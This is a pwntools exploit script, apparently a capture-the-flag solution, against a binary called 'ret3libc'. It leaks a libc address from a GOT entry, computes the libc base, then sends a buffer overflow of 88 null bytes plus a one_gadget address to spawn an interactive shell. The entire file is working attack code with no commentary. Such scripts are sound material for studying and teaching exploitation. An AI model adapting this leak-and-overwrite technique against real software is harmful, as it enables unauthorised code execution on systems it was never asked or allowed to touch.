from pwn import *

exe = ELF('ret3libc', checksec=False)
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # b*dev_function+0
                # b* 0x0000000000401261
                b* vuln+246
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('localhost', 456)
else:
        p = process(exe.path)

GDB()

payload = b"dev" + p32(0x404018)
payload = payload.ljust(16, b'\0')
sla(b"bone", payload)
p.recvuntil(b"results:\n")
payload = p8(0x7f)
sla(b"bone", payload)
p.recvuntil(b"results:\n")

libc_leak = u64(p.recvuntil(b"Search", drop = True)[:-1] + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc base: " + hex(libc.address))
# p.recvuntil(b"results:\n")

one_gadget = libc.address + 0xebcf1
payload = b"a"
sla(b"bone", payload)

p.recvuntil(b"results:\n")

one_gadget = libc.address + 0xebcf1
payload = b"\0" *88 + p64(one_gadget)
sla(b"bone", payload)

p.interactive()
